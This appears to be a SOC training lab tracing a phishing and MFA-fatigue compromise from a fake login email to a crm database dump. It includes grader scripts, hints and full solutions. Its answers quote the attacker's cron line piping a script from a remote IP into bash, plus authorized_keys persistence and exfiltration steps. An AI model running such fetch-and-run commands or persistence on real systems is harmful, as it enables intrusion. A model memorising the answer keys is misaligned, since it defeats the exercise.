# Lab 1: From a phishing email to the database

Tuesday, 13 October 2026, 11:38 local time (CEST, UTC+2). The helpdesk forwards a ticket to the SOC: Jelena Kovač, an infrastructure engineer at Drina Logistika, clicked a link in an "IT support" email, typed her password and, after a series of MFA prompts, approved one. You are the analyst on duty. The evidence has already been collected in `/root`:

| Path | What it is |
|---|---|
| `tiket.txt` | the helpdesk report (local time; the ticket text is in Serbian) |
| `mail/hitno-mfa.eml` | the original message with headers and attachment |
| `data/SigninLogs.csv`, `data/AuditLogs.csv` | Entra ID sign-ins and audit for 12 and 13 October (tables for `kql`) |
| `logs/vpn.log` | OpenVPN server (sign-in through Entra ID) |
| `logs/jump01-auth.log`, `logs/db01-auth.log` | `auth.log` from the jump host and the database server |
| `logs/wazuh-alerts.json` | Wazuh alerts for both hosts (one JSON object per line) |
| `jump01/` | a snapshot of part of the jump01 file system: the `jkovac` home directory, crontabs |

All logs are in **UTC**. Write answers to `/root/odgovori/` (answers), queries to `/root/kql/` and the report to `/root/izvjestaj/` (report).

```bash
cat tiket.txt
kql -c 'SigninLogs | getschema'
kql -c 'SigninLogs | take 3'
```

<!-- timer
60
-->

<!-- setup
set -e
cp -r /opt/scenariji/02-phishing-i-nalog/. /root/
mkdir -p /root/odgovori /root/kql /root/izvjestaj
-->

## The phishing email and IOCs

Examine the headers of `mail/hitno-mfa.eml`: who the real sender is, from which IP address the message reached `mx01`, what SPF, DKIM and DMARC say and where the link leads. Extract the attachment and compute its SHA-256.

Write to `/root/odgovori/ioc.txt`, one per line:

1. the IP address of the server that sent the message (from the `Received` header added by **our** `mx01`),
2. the attacker's domain (from `smtp.mailfrom`, DKIM `d=` and the link),
3. the SHA-256 of the attachment (64 hex characters).

```bash
grep -nE '^(Received|Authentication-Results|Return-Path|From|Reply-To|Date|Message-ID):' -A3 mail/hitno-mfa.eml
python3 - <<'EOF'
import email, hashlib
m = email.message_from_file(open('/root/mail/hitno-mfa.eml'))
for p in m.walk():
    if p.get_content_maintype() == 'multipart':
        continue
    data = p.get_payload(decode=True)
    print(p.get_content_type(), p.get_filename(), hashlib.sha256(data).hexdigest())
    print(data.decode(errors='replace')[:600])
EOF
```

<!-- verify
f=/root/odgovori/ioc.txt
[ -s $f ] || { echo "missing $f"; exit 1; }
grep -q '198\.51\.100\.61' $f || { echo "the IP address of the sending server is missing (Received from mx01)"; exit 1; }
grep -qi 'drinalog-sso\.example' $f || { echo "the attacker's domain is missing"; exit 1; }
h=$(python3 -c 'import email,hashlib,sys;m=email.message_from_file(open(sys.argv[1]));print([hashlib.sha256(p.get_payload(decode=True)).hexdigest() for p in m.walk() if p.get_filename()][0])' /root/mail/hitno-mfa.eml)
grep -qi "$h" $f || { echo "the SHA-256 of the attachment MFA-registracija.htm is missing"; exit 1; }
-->
<!-- hint
Read `Received` headers from the bottom up; trust only the ones your own servers added. `From` says `drinalog.example`, but SPF and DKIM passed for a **different** domain, so DMARC (which requires alignment with `From`) fails. The `p=none` policy means the message was delivered anyway. The displayed link text (`login.microsoftonline.com`) is not the same as the `href`.
-->
<!-- solution
h=$(python3 -c 'import email,hashlib,sys;m=email.message_from_file(open(sys.argv[1]));print([hashlib.sha256(p.get_payload(decode=True)).hexdigest() for p in m.walk() if p.get_filename()][0])' /root/mail/hitno-mfa.eml)
printf '198.51.100.61\ndrinalog-sso.example\nlogin.drinalog-sso.example\n%s\n' "$h" > /root/odgovori/ioc.txt
-->

## MFA fatigue in the sign-ins

Code `500121` in `SigninLogs` means the second factor did not succeed (the user denied the prompt or did not confirm it). Write `/root/kql/mfa.kql` that finds user–IP address pairs with **at least 5** such failures. Columns: `UserPrincipalName`, `IPAddress`, `MfaDenied`. Save the result to `/root/kql/mfa.csv`.

```kql
SigninLogs
| where ResultType == 500121
| summarize ...
```

<!-- verify
[ -f /root/kql/mfa.kql ] || { echo "missing /root/kql/mfa.kql"; exit 1; }
rm -f /root/kql/mfa.csv; kql /root/kql/mfa.kql >/dev/null 2>&1
kql-isto /root/kql/mfa.csv 'SigninLogs | where ResultType == 500121 | summarize MfaDenied = count() by UserPrincipalName, IPAddress | where MfaDenied >= 5' sort || { echo "the result is not correct (columns UserPrincipalName, IPAddress, MfaDenied; only pairs with >= 5)"; cat /root/kql/mfa.csv 2>/dev/null; exit 1; }
-->
<!-- hint
```kql
SigninLogs
| where ResultType == 500121
| summarize MfaDenied = count() by UserPrincipalName, IPAddress
| where MfaDenied >= 5
.save /root/kql/mfa.csv
```
Without the threshold you also get Nikola and Ana: one or two expired MFA prompts are normal. Seven denials in 8 minutes from an unknown address are not.
-->
<!-- solution
printf 'SigninLogs\n| where ResultType == 500121\n| summarize MfaDenied = count() by UserPrincipalName, IPAddress\n| where MfaDenied >= 5\n.save /root/kql/mfa.csv\n' > /root/kql/mfa.kql
kql /root/kql/mfa.kql >/dev/null
-->

## What the attacker did with the account

Write `/root/kql/napadac.kql` (attacker): all **successful** sign-ins (`ResultType == 0`) from the attacker's IP address, columns `TimeGenerated`, `AppDisplayName`, `AuthenticationRequirement`, `SessionId`, oldest first. Save to `/root/kql/napadac.csv`.

Then write:

- `/root/odgovori/ip.txt`: the attacker's IP address,
- `/root/odgovori/prva-prijava.txt` (first sign-in): the time of the attacker's first successful sign-in in UTC (`2026-10-13T08:00:00Z`),
- `/root/odgovori/mfa-registracija.txt` (MFA registration): the time (UTC) when a new MFA method was registered on Jelena's account (table `AuditLogs`).

Compare Jelena's successful sign-ins by country: how many minutes pass between a sign-in from Serbia and one from the Netherlands?

<!-- verify
[ -f /root/kql/napadac.kql ] || { echo "missing /root/kql/napadac.kql"; exit 1; }
rm -f /root/kql/napadac.csv; kql /root/kql/napadac.kql >/dev/null 2>&1
kql-isto /root/kql/napadac.csv 'SigninLogs | where IPAddress == "203.0.113.77" and ResultType == 0 | project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId | order by TimeGenerated asc' || { echo "napadac.csv is not correct (successful sign-ins from the attacker IP, 4 columns, ascending by time)"; exit 1; }
grep -qx '203\.0\.113\.77' /root/odgovori/ip.txt 2>/dev/null || { echo "ip.txt should contain only the attacker IP address"; exit 1; }
grep -Eq '2026-10-13[T ]08:12:05' /root/odgovori/prva-prijava.txt 2>/dev/null || { echo "prva-prijava.txt: the time of the first successful attacker sign-in is wrong (UTC)"; exit 1; }
grep -Eq '2026-10-13[T ]08:15:02' /root/odgovori/mfa-registracija.txt 2>/dev/null || { echo "mfa-registracija.txt: the MFA method registration time is wrong (UTC)"; exit 1; }
-->
<!-- hint
```kql
SigninLogs
| where UserPrincipalName == "jelena.kovac@drinalog.example" and ResultType == 0
| project TimeGenerated, IPAddress, Location, AppDisplayName, SessionId
| order by TimeGenerated asc

AuditLogs
| where InitiatedByIP == "203.0.113.77"
```
The same `SessionId` on all attacker sign-ins and `singleFactorAuthentication` after the first one: the attacker no longer needs MFA because they use the token of the session Jelena approved. That is why a password reset is not enough; the sessions must be revoked.
-->
<!-- solution
printf 'SigninLogs\n| where IPAddress == "203.0.113.77" and ResultType == 0\n| project TimeGenerated, AppDisplayName, AuthenticationRequirement, SessionId\n| order by TimeGenerated asc\n.save /root/kql/napadac.csv\n' > /root/kql/napadac.kql
kql /root/kql/napadac.kql >/dev/null
echo 203.0.113.77 > /root/odgovori/ip.txt
echo 2026-10-13T08:12:05Z > /root/odgovori/prva-prijava.txt
echo 2026-10-13T08:15:02Z > /root/odgovori/mfa-registracija.txt
-->

## From VPN to jump01, and persistence

The attacker's sign-ins include the `Drina VPN` application. Find in `logs/vpn.log` which internal address the attacker received, then in `logs/jump01-auth.log` when they logged in to jump01 from it and with which method (Jelena normally uses a key). Then examine the `jump01/` snapshot: what did the attacker leave behind to come back?

Write:

- `/root/odgovori/vpn-ip.txt`: the attacker's internal VPN address,
- `/root/odgovori/ssh-prijava.txt` (SSH login): the time of the attacker's SSH login to jump01 (UTC, `2026-10-13T08:00:00Z`),
- `/root/odgovori/perzistencija.txt` (persistence): the SHA-256 fingerprint of the key the attacker added to `authorized_keys` (form `SHA256:...`) and the IP address the cron job downloads its script from.

```bash
grep 203.0.113.77 logs/vpn.log
grep -n 'jkovac' logs/jump01-auth.log
awk '{print $1, substr($2, 1, 24) "...", $3}' jump01/home/jkovac/.ssh/authorized_keys
ssh-keygen -lf jump01/home/jkovac/.ssh/authorized_keys
cat jump01/var/spool/cron/crontabs/jkovac jump01/home/jkovac/.bash_history
```

<!-- verify
grep -qx '10\.8\.0\.23' /root/odgovori/vpn-ip.txt 2>/dev/null || { echo "vpn-ip.txt should contain only the attacker internal VPN address"; exit 1; }
grep -Eq '2026-10-13[T ]08:24:02' /root/odgovori/ssh-prijava.txt 2>/dev/null || { echo "ssh-prijava.txt: the time of the attacker SSH login is wrong"; exit 1; }
f=/root/odgovori/perzistencija.txt
[ -s $f ] || { echo "missing $f"; exit 1; }
grep deploy@build-07 /root/jump01/home/jkovac/.ssh/authorized_keys > /tmp/.vk
fp=$(ssh-keygen -lf /tmp/.vk | awk '{print $2}'); rm -f /tmp/.vk
grep -qF "$fp" $f || { echo "the fingerprint of the attacker key is missing (ssh-keygen -lf)"; exit 1; }
grep -qF 'SHA256:cXDy5ky' $f && { echo "that is Jelena's legitimate key, not the attacker's"; exit 1; }
grep -q '198\.51\.100\.23' $f || { echo "the IP address from the cron job is missing"; exit 1; }
exit 0
-->
<!-- hint
The pivot goes through three sources: `SigninLogs` (the Drina VPN application, 08:20:44) → `vpn.log` (public IP 203.0.113.77 gets 10.8.0.23) → `auth.log` (`Accepted password for jkovac from 10.8.0.23`). The Linux account `jkovac` and the Entra account `jelena.kovac@...` are the same person through SSSD, so the same stolen password also opens SSH.

`ssh-keygen -lf authorized_keys` prints the fingerprint of every key. The comment `deploy@build-07` is just text the attacker chooses; Jelena has no build server.
-->
<!-- solution
echo 10.8.0.23 > /root/odgovori/vpn-ip.txt
echo 2026-10-13T08:24:02Z > /root/odgovori/ssh-prijava.txt
ssh-keygen -lf /root/jump01/home/jkovac/.ssh/authorized_keys | grep deploy@build-07 | awk '{print $2}' > /root/odgovori/perzistencija.txt
echo '198.51.100.23 (cron: curl http://198.51.100.23/k.sh | bash)' >> /root/odgovori/perzistencija.txt
-->

## Lateral movement and Wazuh alerts

Wazuh was running the whole time, but nobody looked at the lower-level alerts. Write a jq query that extracts from `logs/wazuh-alerts.json` the alerts from **13 October** with `rule.level` **5 or higher**, as lines `timestamp<TAB>agent.name<TAB>rule.id`, in file order. Save the result to `/root/odgovori/alarmi.tsv` (alerts).

Then write to `/root/odgovori/lateralno.txt` (lateral) which host the attacker moved to from jump01 and which database they exfiltrated.

```bash
jq -c '{t: .timestamp, a: .agent.name, l: .rule.level, d: .rule.description}' logs/wazuh-alerts.json
jq 'select(.agent.name == "db01" and .rule.id == "100310")' logs/wazuh-alerts.json
grep -n '10.20.0.10' logs/db01-auth.log
```

<!-- verify
f=/root/odgovori/alarmi.tsv
[ -s $f ] || { echo "missing $f"; exit 1; }
ref=$(jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13"))) | [.timestamp, .agent.name, .rule.id] | @tsv' /root/logs/wazuh-alerts.json)
[ "$(cat $f)" = "$ref" ] || { echo "alarmi.tsv is not correct (13 Oct, level >= 5, timestamp/agent.name/rule.id separated by tabs)"; exit 1; }
l=/root/odgovori/lateralno.txt
grep -Eqi 'db01|10\.20\.0\.31' $l 2>/dev/null || { echo "lateralno.txt: which host did the attacker move to?"; exit 1; }
grep -qi 'crm' $l || { echo "lateralno.txt: which database did the attacker exfiltrate?"; exit 1; }
-->
<!-- hint
```bash
jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13")))
       | [.timestamp, .agent.name, .rule.id] | @tsv' logs/wazuh-alerts.json > odgovori/alarmi.tsv
```
Alert 531 (disk) is noise. The other three tell the story: a modified `authorized_keys` (550), a modified crontab (2832) and a `pg_dump` of the `crm` database on db01 (100310). The login to db01 with the `jkovac@jump01` key looks like Jelena's daily work: the private key sits on jump01, so the attacker simply uses it.
-->
<!-- solution
jq -r 'select(.rule.level >= 5 and (.timestamp | startswith("2026-10-13"))) | [.timestamp, .agent.name, .rule.id] | @tsv' /root/logs/wazuh-alerts.json > /root/odgovori/alarmi.tsv
echo 'db01 (10.20.0.31): pg_dump baze crm u /tmp/.cache.sql, scp na jump01 i curl na 198.51.100.23' > /root/odgovori/lateralno.txt
-->

## Containment plan

Write `/root/izvjestaj/obuzdavanje.md` (containment): a checklist of actions **in the order you would perform them**, with a short justification. The list must cover:

- the account: revoking sessions, resetting the password, removing the MFA method the attacker added,
- the network: blocking the attacker's IP address and the C2 address,
- jump01: removing the key from `authorized_keys` and the cron job (after collecting evidence),
- db01 and the `id_ed25519` key on jump01 that the attacker used (rotate it).

<!-- verify
f=/root/izvjestaj/obuzdavanje.md
[ -s $f ] || { echo "missing $f"; exit 1; }
grep -Eqi 'revoke|opoz' $f || { echo "revoking sessions is missing (revoke)"; exit 1; }
grep -Eqi 'lozink|password' $f || { echo "the password reset is missing"; exit 1; }
grep -Eqi 'mfa|authenticator' $f || { echo "removing the attacker MFA method is missing"; exit 1; }
grep -q '203\.0\.113\.77' $f || { echo "blocking the attacker IP address is missing"; exit 1; }
grep -q '198\.51\.100\.23' $f || { echo "blocking the C2 address is missing"; exit 1; }
grep -q 'authorized_keys' $f || { echo "removing the key from authorized_keys is missing"; exit 1; }
grep -Eqi 'cron' $f || { echo "removing the cron job is missing"; exit 1; }
grep -Eqi 'id_ed25519|rotir|rotat' $f || { echo "rotating the id_ed25519 key from jump01 is missing"; exit 1; }
-->
<!-- hint
Order matters. First close the access the attacker has **right now** (sessions, password, MFA method, VPN and IP), because every minute of waiting means new actions. Preserve the evidence from jump01 (crontab, `authorized_keys`, `.bash_history`) with a hash **before** deleting anything. Do not power jump01 off abruptly: you would lose processes and network connections.
-->
<!-- solution
cat > /root/izvjestaj/obuzdavanje.md <<'EOF'
Obuzdavanje: jelena.kovac / jump01 / db01

1. Entra ID: revoke sessions (Revoke-MgUserSignInSession) za jelena.kovac, jer napadač koristi token sesije.
2. Reset lozinke (ista lozinka važi i za SSSD na jump01), privremeno blokiran sign-in do završetka.
3. Ukloniti MFA metod Authenticator App (SM-A546B) koji je napadač registrovao u 08:15:02.
4. Prekinuti VPN sesiju 10.8.0.23; blokirati 203.0.113.77 na VPN-u i firewallu, 198.51.100.23 (C2) na egressu.
5. jump01: prikupiti dokaze (crontab, authorized_keys, .bash_history, auth.log) sa SHA-256, pa ukloniti ključ deploy@build-07 iz authorized_keys i cron posao.
6. Rotirati ključ id_ed25519 sa jump01 (ukloniti jkovac@jump01 iz authorized_keys na db01 i app01).
7. db01: obrisati /tmp/.cache.sql poslije prikupljanja, procijeniti curenje baze crm (obavještavanje).
EOF
-->

## Timeline and report

Create `/root/izvjestaj/vremenska-linija.csv` (timeline) with the header `time_utc,source,event` and at least 8 events, sorted by time, with times in the form `2026-10-13T08:12:05Z`. The timeline must include the delivery of the email, the attacker's first successful sign-in, the SSH login to jump01, the `authorized_keys` change, the crontab change, the login to db01 and the `pg_dump`.

Then write a short `/root/izvjestaj/izvjestaj.md` (report) with the sections: summary, root cause, impact, recommendations.

<!-- verify
f=/root/izvjestaj/vremenska-linija.csv
[ -s $f ] || { echo "missing $f"; exit 1; }
[ "$(head -1 $f | tr -d '\r')" = "time_utc,source,event" ] || { echo "the first line must be time_utc,source,event"; exit 1; }
[ "$(tail -n +2 $f | grep -c .)" -ge 8 ] || { echo "at least 8 events are needed"; exit 1; }
tail -n +2 $f | grep . | cut -d, -f1 | grep -Evq '^2026-10-1[23]T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$' && { echo "every time must be in the form 2026-10-13T08:12:05Z"; exit 1; }
tail -n +2 $f | grep . | cut -d, -f1 | sort -c 2>/dev/null || { echo "the events are not sorted by time"; exit 1; }
for x in 07:42:10 08:12:05 08:24:02 08:26:41 08:27:15 08:30:58 08:33:40; do
  grep -q "^2026-10-13T$x" $f || { echo "a key event at $x UTC is missing"; exit 1; }
done
r=/root/izvjestaj/izvjestaj.md
[ -s $r ] || { echo "missing $r"; exit 1; }
grep -Eqi 'sažetak|sazetak|summary' $r || { echo "the report has no summary"; exit 1; }
grep -Eqi 'uzrok|root cause' $r || { echo "the report has no root cause"; exit 1; }
grep -Eqi 'uticaj|impact' $r || { echo "the report has no impact"; exit 1; }
grep -Eqi 'preporu|recommend' $r || { echo "the report has no recommendations"; exit 1; }
-->
<!-- hint
Convert the time from the `Date: ... +0200` header and from the ticket (CEST) to UTC (subtract 2 hours). `auth.log` has no year, but the host runs in UTC. The Wazuh `timestamp` has milliseconds and `+0000`: cut it to seconds and add `Z`.

```text
time_utc,source,event
2026-10-13T07:42:10Z,mx01,Phishing email delivered (198.51.100.61)
2026-10-13T08:12:05Z,SigninLogs,First successful attacker sign-in after 7 denied MFA prompts
...
```
-->
<!-- solution
cat > /root/izvjestaj/vremenska-linija.csv <<'EOF'
time_utc,source,event
2026-10-13T07:42:10Z,mx01,Phishing poruka primljena od 198.51.100.61 (DMARC fail p=none)
2026-10-13T08:03:12Z,SigninLogs,Prvi pokušaj prijave sa 203.0.113.77 (NL) ispravnom lozinkom
2026-10-13T08:12:05Z,SigninLogs,Uspješna prijava napadača poslije 7 odbijenih MFA zahtjeva
2026-10-13T08:15:02Z,AuditLogs,Napadač registrovao Authenticator App
2026-10-13T08:20:52Z,vpn.log,VPN sesija napadača dobila 10.8.0.23
2026-10-13T08:24:02Z,jump01 auth.log,SSH prijava jkovac lozinkom sa 10.8.0.23
2026-10-13T08:26:41Z,Wazuh 550,Izmijenjen /home/jkovac/.ssh/authorized_keys
2026-10-13T08:27:15Z,jump01 auth.log,Izmijenjen crontab jkovac (curl 198.51.100.23 | bash)
2026-10-13T08:30:58Z,db01 auth.log,SSH sa jump01 na db01 ključem jkovac@jump01
2026-10-13T08:33:40Z,Wazuh 100310,pg_dump baze crm u /tmp/.cache.sql
2026-10-13T09:38:00Z,tiket,Jelena prijavila incident helpdesku
EOF
cat > /root/izvjestaj/izvjestaj.md <<'EOF'
Izvještaj: kompromitovan nalog jelena.kovac

Sažetak: phishing poruka je ukrala lozinku, MFA umor je napadaču dao sesiju, a ista lozinka SSH na jump01.
Napadač je ostavio ključ i cron i izvukao bazu crm sa db01.
Uzrok (root cause): DMARC p=none, push MFA bez number matchinga, ista lozinka za Entra ID i SSH, privatni ključ na jump01.
Uticaj: moguće curenje baze crm (lični podaci klijenata), kompromitovani jump01 i db01.
Preporuke: DMARC p=reject, number matching ili FIDO2, SSH samo ključem, bez privatnih ključeva na jump hostu, alarm na 5+ MFA odbijanja.
EOF
-->
